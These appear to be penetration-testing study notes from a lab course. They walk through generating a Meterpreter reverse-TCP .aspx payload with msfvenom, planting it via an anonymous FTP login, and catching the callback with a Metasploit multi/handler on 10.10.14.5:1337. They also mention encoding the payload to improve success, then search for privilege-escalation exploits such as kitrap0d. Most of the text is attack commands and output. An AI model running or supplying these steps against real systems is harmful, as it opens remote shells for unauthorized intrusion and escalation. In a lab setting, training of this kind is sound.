- `MSFVenom` is the successor of `MSFPayload` and `MSFEncode`, two stand-alone scripts that used to work in conjunction with `msfconsole` to provide users with highly customizable and hard-to-detect payloads for their exploits.

### Creating Our Payloads
Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident.
in the example we have ftp anonymous login to that we will build the payload 
we use `.aspx` but we can use msfvenom for the same job
#### Generating Payload
```shell-session
sfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

ls

Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates

```
navigate to `http://10.10.10.5/reverse_shell.aspx`, and it will trigger the `.aspx` payload

we should start a listener on msfconsole so that the reverse connection request gets caught inside it.
```shell-session
msfconsole -q 

msf6 > use multi/handler
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.14.5

LHOST => 10.10.14.5


msf6 exploit(multi/handler) > set LPORT 1337

LPORT => 1337


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337 
```
If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.

### Local Exploit Suggester
- module called the `Local Exploit Suggester`. We will be using this module for this example, as the Meterpreter shell landed on the `IIS APPPOOL\Web` user, which naturally does not have many permissions. Furthermore, running the `sysinfo` command shows us that the system is of x86 bit architecture,

```shell-session
msf6 > search local exploit suggester
```

#### MSF - Local Privilege Escalation

```shell-session
search kitrap0d
```